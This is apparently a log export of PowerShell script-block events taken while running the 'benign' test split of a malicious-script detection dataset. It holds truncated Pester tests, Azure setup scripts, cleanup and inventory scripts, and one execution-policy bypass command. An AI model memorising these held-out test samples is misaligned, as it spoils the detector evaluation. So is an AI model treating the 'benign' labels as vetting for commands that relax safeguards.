"8/6/2026 9:20:47 AM","C:\TA\project-ta\data_spliting\test_set\benign\1838.ps1","1404","Describe ""Test-Push-Location"" -Tags ""CI"" {; New-Variable -Name startDirectory -Value $(Get-Location).Path -Scope Global -Force; BeforeEach { Set-Location $startDirectory }; It ""Should be called withou"
"8/6/2026 9:20:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\1816.ps1","799","Describe ""Simple ItemProperty Tests"" -Tag ""CI"" {; It ""Can retrieve the PropertyValue with Get-ItemPropertyValue"" {; Get-ItemPropertyValue -path $TESTDRIVE -Name Attributes | Should -Be ""Directory""; };"
"8/6/2026 9:20:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\1799.ps1","1661","Describe ""Clear-EventLog cmdlet tests"" -Tags @('CI', 'RequireAdminOnWindows') {; BeforeAll {; $defaultParamValues = $PSdefaultParameterValues.Clone(); $PSDefaultParameterValues[""it:skip""] = !$IsWindow"
"8/6/2026 9:20:23 AM","C:\TA\project-ta\data_spliting\test_set\benign\1795.ps1","4729","Describe ""Basic Function Provider Tests"" -Tags ""CI"" {; BeforeAll {; $existingFunction = ""existingFunction""; $nonExistingFunction = ""nonExistingFunction""; $text = ""Hello World!""; $functionValue = { ret"
"8/6/2026 9:20:16 AM","","97","Set-Alias -Name gcls -Value Get-CimClass -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","105","Set-Alias -Name ncso -Value New-CimSessionOption -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","99","Set-Alias -Name gcms -Value Get-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","102","Set-Alias -Name rcms -Value Remove-cimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","99","Set-Alias -Name ncms -Value New-CimSession -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","112","Set-Alias -Name rcie -Value Register-CimIndicationEvent -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","110","Set-Alias -Name gcai -Value Get-CimAssociatedInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","101","Set-Alias -Name icim -Value Invoke-CimMethod -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","103","Set-Alias -Name rcim -Value Remove-cimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","101","Set-Alias -Name ncim -Value New-CimInstance  -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","100","Set-Alias -Name scim -Value Set-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:16 AM","","100","Set-Alias -Name gcim -Value Get-CimInstance -Option ReadOnly, AllScope -ErrorAction SilentlyContinue"
"8/6/2026 9:20:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\1793.ps1","1997","Describe ""Rename-Item tests"" -Tag ""CI"" {; BeforeAll {; Setup -f originalFile.txt -content ""This is content""; $source = ""$TESTDRIVE/originalFile.txt""; $target = ""$TESTDRIVE/ItemWhichHasBeenRenamed.txt"""
"8/6/2026 9:20:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\1787.ps1","2210","Describe ""Get-PSProvider"" -Tags ""CI"" {; It ""Should be able to call with no parameters without error"" {; { Get-PSProvider } | Should -Not -Throw; }; It ""Should be able to call the filesystem provider"" "
"8/6/2026 9:19:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\1750.ps1","1161","Import-Module $PSScriptRoot/CronTab/CronTab.psd1; Write-Host -Foreground Yellow ""Get the existing cron jobs""; Get-CronJob | Out-Host; Write-Host -Foreground Yellow ""New cron job to clean out tmp every"
"8/6/2026 9:19:51 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:51 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:51 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:51 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\1749.ps1","262","Import-Module Docker; Pull-ContainerImage hello-world; Run-ContainerImage hello-world; cls; Get-Container | Where-Object State -eq ""exited""; Get-Container | Where-Object State -eq ""exited"" | Remove-Co"
"8/6/2026 9:19:44 AM","","9","$global:?"
"8/6/2026 9:19:44 AM","C:\TA\project-ta\data_spliting\test_set\benign\1692.ps1","141","filter notnull {; $props = @(); $obj = $_; $obj | gm -m *property | % { if ( $obj.$($_.name) ) {$props += $_.name} }; $obj | select $props; }"
"8/6/2026 9:19:36 AM","","9","$global:?"
"8/6/2026 9:19:36 AM","C:\TA\project-ta\data_spliting\test_set\benign\1664.ps1","421","function Get-IEVersion ($computer = $env:COMPUTERNAME) {; $version = 0; $keyname = 'SOFTWARE\Microsoft\Internet Explorer'; $reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('LocalMachine', $comp"
"8/6/2026 9:19:29 AM","","9","$global:?"
"8/6/2026 9:19:29 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:29 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:29 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:29 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:28 AM","C:\TA\project-ta\data_spliting\test_set\benign\1615.ps1","210","$Dest = ""C:\Support\SQLBac\"";; $Daysback = ""0"";; $CurrentDate = Get-Date; $DatetoDelete = $CurrentDate.AddDays($Daysback); Get-ChildItem $Dest | Where-Object { $_.LastWriteTime -lt $DatetoDelete } | R"
"8/6/2026 9:19:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:20 AM","C:\TA\project-ta\data_spliting\test_set\benign\1589.ps1","343","$folders = @('C:\Windows\Temp\*', 'C:\Documents and Settings\*\Local Settings\temp\*', 'C:\Users\*\Appdata\Local\Temp\*', 'C:\Users\*\Appdata\Local\Microsoft\Windows\Temporary Internet Files\*', 'C:\W"
"8/6/2026 9:19:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:19:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:19:12 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:12 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:12 AM","C:\TA\project-ta\data_spliting\test_set\benign\1219.ps1","621","& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve); $manifest = Test-ModuleManifest -Path (Join-Path -Path $PSScriptRoot -ChildPath '..\Carbon\Carbon.psd1' -Resolve); De"
"8/6/2026 9:19:05 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:19:05 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:19:04 AM","C:\TA\project-ta\data_spliting\test_set\benign\12.ps1","569","$poshGitModule = Get-Module posh-git -ListAvailable | Sort-Object Version -Descending | Select-Object -First 1; if ($poshGitModule) {; $poshGitModule | Import-Module; }; elseif (Test-Path -LiteralPath"
"8/6/2026 9:19:04 AM","","6","prompt"
"8/6/2026 9:19:02 AM","","58","Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass"
"8/6/2026 9:18:57 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:18:57 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:18:57 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:18:57 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:18:56 AM","C:\TA\project-ta\data_spliting\test_set\benign\1034.ps1","318","Set-StrictMode -Version Latest; & (Join-Path $PSScriptRoot Carbon\Import-Carbon.ps1 -Resolve); $websitePath = Join-Path $PSScriptRoot Website -Resolve; Install-IisWebsite -Name 'get-carbon.org' -Path "
"8/6/2026 9:18:49 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:18:49 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:18:49 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:18:40 AM","C:\TA\project-ta\data_spliting\test_set\benign\1029.ps1","557","Login-AzAccount; Get-AzSubscription; Set-AzContext -SubscriptionId ""yourSubscriptionID""; $RGname=""sfclustertutorialgroup""; $port=8081; $rulename=""allowAppPort$port""; $nsgname=""sf-vnet-security""; $nsg "
"8/6/2026 9:18:32 AM","C:\TA\project-ta\data_spliting\test_set\benign\1015.ps1","1007","$random = (New-Guid).ToString().Substring(0,8); $subscriptionId = ""my-azure-subscription-id""; $apimServiceName = ""apim-$random""; $resourceGroupName = ""apim-rg-$random""; $location = ""Japan East""; $orga"
"8/6/2026 9:18:24 AM","C:\TA\project-ta\data_spliting\test_set\benign\1012.ps1","1310","$random = (New-Guid).ToString().Substring(0,8); $subscriptionId = ""my-azure-subscription-id""; $apimServiceName = ""apim-$random""; $resourceGroupName = ""apim-rg-$random""; $location = ""Japan East""; $orga"
"8/6/2026 9:18:16 AM","C:\TA\project-ta\data_spliting\test_set\benign\1008.ps1","430","$myTopic = ""<your-custom-topic-name>""; $myEndpoint = ""<your-endpoint-URL>""; $myResourceGroup = ""<resource-group-name>""; New-AzResourceGroup -Name $myResourceGroup -Location westus2; New-AzEventGridTop"
"8/6/2026 9:18:08 AM","C:\TA\project-ta\data_spliting\test_set\benign\1006.ps1","317","$myEndpoint = ""<your-endpoint-URL>""; $myResourceGroup = ""<resource-group-name>""; $resourceGroupID = (New-AzResourceGroup -Name $myResourceGroup -Location westus2).ResourceId; New-AzEventGridSubscripti"
"8/6/2026 9:18:00 AM","","9","$global:?"
"8/6/2026 9:18:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:18:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:18:00 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:18:00 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:17:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\1001.ps1","193","$myEndpoint = ""<your-endpoint-URL>""; Set-AzContext -Subscription ""<subscription-name-or-ID>""; New-AzEventGridSubscription -Endpoint $myEndpoint -EventSubscriptionName demoSubscriptionToAzureSub"
"8/6/2026 9:17:59 AM","","9",".\uji.ps1"
"8/6/2026 9:16:33 AM","","6","prompt"
"8/6/2026 9:16:26 AM","C:\TA\project-ta\data_spliting\test_set\benign\433.ps1","350","Register-PSFTeppScriptblock -Name ""PSFramework-config-name"" -ScriptBlock {; $moduleName = ""*""; if ($fakeBoundParameter.Module) { $moduleName = $fakeBoundParameter.Module }; [PSFramework.Configuration."
"8/6/2026 9:16:19 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:16:19 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:16:18 AM","C:\TA\project-ta\data_spliting\test_set\benign\424.ps1","226","Register-PSFTeppScriptblock -Name ""PSFramework-config-fullname"" -ScriptBlock {; [PSFramework.Configuration.ConfigurationHost]::Configurations.Values | Where-Object { -not $_.Hidden } | Select-Object -"
"8/6/2026 9:16:10 AM","C:\TA\project-ta\data_spliting\test_set\benign\422.ps1","145","Register-PSFTeppScriptblock -Name 'PSFramework-config-validation' -ScriptBlock { [PSFramework.Configuration.ConfigurationHost]::Validation.Keys }"
"8/6/2026 9:16:02 AM","C:\TA\project-ta\data_spliting\test_set\benign\4200.ps1","503","Function EnableIEActiveXControl ($AppName,$GUID,$Flag) {; $Key = ""HKLM:\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\""+$GUID; If ((Test-Path $Key) -eq $true) {; Write-Host $AppName""....."
"8/6/2026 9:16:02 AM","C:\TA\project-ta\data_spliting\test_set\benign\4200.ps1","1550","Set-Variable -Name Errors -Value $null -Scope Global -Force; Set-Variable -Name LogFile -Value ""c:\windows\waller\Logs\BuildLogs\AdobeFlashPlayer.log"" -Scope Global -Force; Set-Variable -Name Relative"
"8/6/2026 9:15:54 AM","C:\TA\project-ta\data_spliting\test_set\benign\4198.ps1","574","Function InitializeGlobalMemory {; Set-Variable -Name Computers -Scope Global -Force; Set-Variable -Name Logfile -Scope Global -Force; Set-Variable -Name RelativePath -Scope Global -Force; Set-Variabl"
"8/6/2026 9:15:54 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:15:54 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:15:54 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:15:54 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:15:54 AM","C:\TA\project-ta\data_spliting\test_set\benign\4198.ps1","4344","Function InitializeGlobalMemory {; Set-Variable -Name Computers -Scope Global -Force; Set-Variable -Name Logfile -Scope Global -Force; Set-Variable -Name RelativePath -Scope Global -Force; Set-Variabl"
"8/6/2026 9:14:38 AM","C:\TA\project-ta\data_spliting\test_set\benign\4087.ps1","955","; $PatchReboot = Get-ChildItem -Path REGISTRY::""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired"" -ErrorAction SilentlyContinue; $ComponentBasedReb"
"8/6/2026 9:14:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:14:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:14:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:14:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:14:30 AM","C:\TA\project-ta\data_spliting\test_set\benign\4080.ps1","540","Import-Module $env:ProgramFiles""\Microsoft Security Client\MpProvider""; Start-MProtScan -ScanType ""FullScan""; New-EventLog â€“LogName System â€“Source ""Antimalware Full Scan""; Write-EventLog -LogName "
"8/6/2026 9:14:22 AM","","9","$global:?"
"8/6/2026 9:14:22 AM","C:\TA\project-ta\data_spliting\test_set\benign\3990.ps1","5061","function NetworkRuleSetTests {; $location = Get-Location; $resourceGroupName = getAssetName ""RSG""; $namespaceName = getAssetName ""ServiceBus-Namespace-""; $namespaceName2 = getAssetName ""ServiceBus-Nam"
"8/6/2026 9:14:15 AM","","9","$global:?"
"8/6/2026 9:14:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\3986.ps1","10113","function ServiceBusTests {; $location = Get-Location; $resourceGroupName = getAssetName ""RGName-""; $namespaceName = getAssetName ""Namespace1-""; $namespaceName2 = getAssetName ""Namespace2-""; Write-Debu"
"8/6/2026 9:14:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\375.ps1","1195","Describe ""Get-PSFConfig Unit Tests"" -Tag ""CI"", ""Config"", ""Unit"" {; BeforeAll {; Get-PSFConfig -Module PSFTests -Force | ForEach-Object {; $null = [PSFramework.Configuration.ConfigurationHost]::Configu"
"8/6/2026 9:13:59 AM","","9","$global:?"
"8/6/2026 9:13:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\3499.ps1","206","if ($PSEdition -eq 'Desktop') {; try {; [Microsoft.Azure.PowerShell.Authenticators.DesktopAuthenticatorBuilder]::Apply([Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance); } catch"
"8/6/2026 9:13:52 AM","","9","$global:?"
"8/6/2026 9:13:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\3100.ps1","724","$buildDir = ""$PSScriptRoot\build""; $ErrorActionPreference = 'Stop'; if (Test-Path $buildDir) {; Write-Verbose ""Removing build dir""; Remove-Item $buildDir -Recurse -Force -Confirm:$false -Verbose -Erro"
"8/6/2026 9:13:44 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:13:44 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:13:44 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:13:43 AM","C:\TA\project-ta\data_spliting\test_set\benign\3080.ps1","815","$global:ValidatorRoot = Split-Path $MyInvocation.MyCommand.Path; BeforeEachFeature {; New-Module -Name ValidatorTestEs {; . $global:ValidatorRoot\ValidatorEs.ps1 -Verbose; } | Import-Module -Global; }"
"8/6/2026 9:13:35 AM","C:\TA\project-ta\data_spliting\test_set\benign\3065.ps1","2653","Set-StrictMode -Version Latest; InModuleScope Pester {; Describe ""Should -HaveCount"" {; It ""passes if collection has the expected amount of items"" {; @(1, 'a', 3) | Should -HaveCount 3; }; It ""passes "
"8/6/2026 9:13:27 AM","C:\TA\project-ta\data_spliting\test_set\benign\3034.ps1","1541","Set-StrictMode -Version Latest; InModuleScope Pester {; Describe ""Should -Exist"" {; It ""returns true for paths that exist"" {; $TestDrive | Should Exist; $TestDrive | Should -Exist; }; It ""returns fals"
"8/6/2026 9:13:19 AM","C:\TA\project-ta\data_spliting\test_set\benign\3027.ps1","444","Set-StrictMode -Version Latest; InModuleScope Pester {; Describe ""the In statement"" {; Setup -Dir ""test_path""; It ""executes a command in that directory"" {; In ""$TestDrive"" -Execute { """" | Out-File ""te"
"8/6/2026 9:13:11 AM","C:\TA\project-ta\data_spliting\test_set\benign\2959.ps1","215","properties {; $my_property = $p1 + $p2; }; task default -depends TestParams; task TestParams {; Assert ($my_property -ne $null) ""`$my_property should not be null. Run with -parameters @{'p1' = 'v1'; '"
"8/6/2026 9:13:04 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:13:04 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:13:04 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:13:04 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:13:03 AM","C:\TA\project-ta\data_spliting\test_set\benign\2945.ps1","139","Framework '4.0x86'; task default -depends MsBuild; task MsBuild {; if ( $IsMacOS -OR $IsLinux ) {}; else {; exec { msbuild /version }; }; }"
"8/6/2026 9:12:55 AM","C:\TA\project-ta\data_spliting\test_set\benign\2939.ps1","224","task default -depends Test; task Test -depends Compile, Clean -PreAction {""Pre-Test""} -Action {; Assert $false ""This fails.""; } -PostAction {""Post-Test""}; task Compile -depends Clean {; ""Compile""; }; "
"8/6/2026 9:12:47 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:12:47 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:12:47 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:12:47 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:12:47 AM","C:\TA\project-ta\data_spliting\test_set\benign\2923.ps1","608","task default -depends Test; task Test -depends Compile, Clean {; Assert $false ""This fails.""; }; task Compile -depends Clean {; ""Compile""; }; task Clean {; ""Clean""; }; taskTearDown {; param($task); As"
"8/6/2026 9:12:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\2914.ps1","213","Framework ""1.1.0""; task default -depends MsBuild; task MsBuild {; if ( $IsMacOS -OR $IsLinux ) {; $output = &dotnet build -version -nologo 2>&1; Assert ($output -NotLike ""15.1"") '$output should contai"
"8/6/2026 9:12:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:12:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:12:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:12:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:12:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\2911.ps1","368","Properties {; [string]$testProperty = ""Test123""; }; BuildTearDown {; [string]$expected = ""Test123""; if ($testProperty -ne $expected) {; throw ""Expected '$expected', but was actually '$testProperty'""; "
"8/6/2026 9:12:23 AM","C:\TA\project-ta\data_spliting\test_set\benign\2903.ps1","247","Framework '3.5'; task default -depends AspNetCompiler; task AspNetCompiler {; if ( $IsMacOS -OR $IsLinux ) {}; else {; aspnet_compiler; if ($LastExitCode -ne 1) {; throw 'Error: Could not execute aspn"
"8/6/2026 9:12:15 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:12:15 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:12:15 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:12:15 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:12:15 AM","C:\TA\project-ta\data_spliting\test_set\benign\2900.ps1","376","Properties {; [string]$testProperty = ""Test123""; }; BuildSetup {; [string]$expected = ""Test123""; if ($testProperty -ne $expected) {; throw ""Expected sequence '$expected', but was actually '$testProper"
"8/6/2026 9:12:07 AM","C:\TA\project-ta\data_spliting\test_set\benign\2897.ps1","471","properties {; $container = @{}; $container.foo = ""foo""; $container.bar = $null; $foo = 1; $bar = 1; }; task default -depends TestInit; task TestInit {; Assert ($container.foo -eq ""foo"") ""$container.fo"
"8/6/2026 9:11:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:11:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:11:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:11:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:11:59 AM","C:\TA\project-ta\data_spliting\test_set\benign\2891.ps1","248","Task default -Depends RunWhatIf; Task RunWhatIf {; try {; $global:WhatIfPreference = $true; $parameters = @{p1='whatifcheck';}; Invoke-psake .\nested\whatifpreference.ps1 -parameters $parameters; } fi"
"8/6/2026 9:11:51 AM","C:\TA\project-ta\data_spliting\test_set\benign\2885.ps1","215","Framework '4.7'; task default -depends MsBuild; task MsBuild {; if ( $IsMacOS -OR $IsLinux ) {}; else {; $output = &msbuild /version /nologo 2>&1; Assert ($output -NotLike '15.0') '$output should cont"
"8/6/2026 9:11:43 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:11:43 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:11:43 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/6/2026 9:11:42 AM","C:\TA\project-ta\data_spliting\test_set\benign\2865.ps1","230","task default -depends test; task test {; Push-Location 'missing_build_file'; $result = invoke-psake -Docs | Out-String; Pop-Location; Assert ($result -match 'adefaulttask') 'Default build file should "
"8/6/2026 9:11:35 AM","","9","$global:?"
"8/6/2026 9:11:35 AM","C:\TA\project-ta\data_spliting\test_set\benign\2816.ps1","54","{ $_.StartMode -eq ""Auto"" -or $_.State -eq ""Running"" }"
"8/6/2026 9:11:35 AM","C:\TA\project-ta\data_spliting\test_set\benign\2816.ps1","153","; $data = $null; foreach ($file in (ls *svcall.xml)) {; $data += Import-Clixml $file; }; $data | ? { $_.StartMode -eq ""Auto"" -or $_.State -eq ""Running"" }"
"8/6/2026 9:11:27 AM","C:\TA\project-ta\data_spliting\test_set\benign\2758.ps1","96","; Update-TypeData -TypeName System.Diagnostics.Process -SerializationDepth 3 -Force; Get-Process"
"8/6/2026 9:11:19 AM","","8804","idateNotNull()]
    [timespan[]]
    ${ValidLifetime},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [ValidateNotNull()]
    [timespan[]]
    ${PreferredLifetime},

    [Parameter(Pa"
"8/6/2026 9:11:19 AM","","12591","arameter(ParameterSetName='InputObject (cdxml)')]
    [byte]
    ${PrefixLength},

    [Parameter(ParameterSetName='Query (cdxml)')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    ["
"8/6/2026 9:11:19 AM","","12591","reate', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
        }
    }

          "
"8/6/2026 9:11:19 AM","","12591","pe = 'System.TimeSpan'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
        }
        $__cmdletization_methodParameters.Add($__cm"
"8/6/2026 9:11:19 AM","","12591","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'ROOT/StandardCimv2/"
"8/6/2026 9:11:19 AM","","4573","
#requires -version 3.0

try { Microsoft.PowerShell.Core\Set-StrictMode -Off } catch { }

$script:MyModule = $MyInvocation.MyCommand.ScriptBlock.Module

$script:ClassName = 'root/StandardCimv2/"
"8/6/2026 9:11:19 AM","C:\TA\project-ta\data_spliting\test_set\benign\2747.ps1","14","; Get-NetRoute"
"8/6/2026 9:11:11 AM","","9","$global:?"
"8/6/2026 9:11:11 AM","C:\TA\project-ta\data_spliting\test_set\benign\2729.ps1","229","$ErrorActionPreference = ""SilentlyContinue""; $o = """" | Select-Object IISInstalled; if ((Get-ItemProperty HKLM:\Software\Microsoft\InetStp\Components\).W3SVC) {; $o.IISInstalled = ""True""; } else {; $o."
"8/6/2026 9:11:04 AM","","9","$global:?"
"8/6/2026 9:11:03 AM","C:\TA\project-ta\data_spliting\test_set\benign\2725.ps1","80","{; $obj | Add-Member NoteProperty .NET_$i $_.VersionInfo.ProductVersion; $i++; }"
"8/6/2026 9:11:03 AM","C:\TA\project-ta\data_spliting\test_set\benign\2725.ps1","352","; $obj = """" | Select-Object $($PSVersionTable.Keys); foreach($item in $PSVersionTable.Keys) {; $obj.$item = $($PSVersionTable[$item] -join "".""); }; $i = 1; Get-ChildItem -Force ""$($env:windir)\Microso"
"8/6/2026 9:10:56 AM","","9","$global:?"
"8/6/2026 9:10:55 AM","C:\TA\project-ta\data_spliting\test_set\benign\2723.ps1","88","Get-WmiObject -Namespace root\Microsoft\SecurityClient -Class AntimalwareInfectionStatus"
"8/6/2026 9:10:48 AM","C:\TA\project-ta\data_spliting\test_set\benign\2722.ps1","319","if (Test-Path ""$env:SystemRoot\clrver.exe"") {; $counter = 0; & $env:SystemRoot\clrver.exe -all 2> $null | `; ConvertFrom-Csv -Delimiter `t -Header ""PID"",""ProcessName"",""CLR Version"" | `; ForEach-Object"
"8/6/2026 9:10:39 AM","C:\TA\project-ta\data_spliting\test_set\benign\2720.ps1","263","; $ErrorActionPreference = ""Continue""; Try {; Push-Location; Set-Location Cert:; ls -r * | Select-Object PSParentPath,FriendlyName,NotAfter,NotBefore,SerialNumber,Thumbprint,Issuer,Subject; } Catch {;"
"8/6/2026 9:10:31 AM","C:\TA\project-ta\data_spliting\test_set\benign\2641.ps1","609","$dbs = Invoke-Sqlcmd -ServerInstance localhost -Database tempdb -Query ""SELECT name FROM sys.databases WHERE database_id != 2 and state_desc = 'ONLINE'""; $datestring =  (Get-Date -Format 'yyyyMMddHHmm"
"8/6/2026 9:10:24 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/6/2026 9:10:23 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/6/2026 9:10:23 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/6/2026 9:10:23 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
